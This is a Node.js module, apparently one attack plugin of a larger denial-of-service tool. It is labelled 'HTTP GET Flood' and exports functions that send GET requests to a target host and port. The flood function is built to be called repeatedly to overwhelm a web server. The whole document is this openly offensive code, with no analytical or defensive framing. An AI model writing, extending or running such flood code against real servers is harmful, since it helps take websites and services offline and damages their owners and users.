const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP GET Flood',
    description: 'Simple HTTP GET request flood',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        
        return new Promise((resolve, reject) => {
            const req = protocol.get({
                hostname: target,
                port: port,
                path: '/',
                timeout: 5000
            }, (res) => {
                resolve({ status: res.statusCode, headers: res.headers });
                req.destroy();
            });
            
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        
        const req = protocol.get({
            hostname: target,
            port: port,
            path: '/'
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.on('error', () => callback(false));
    }
};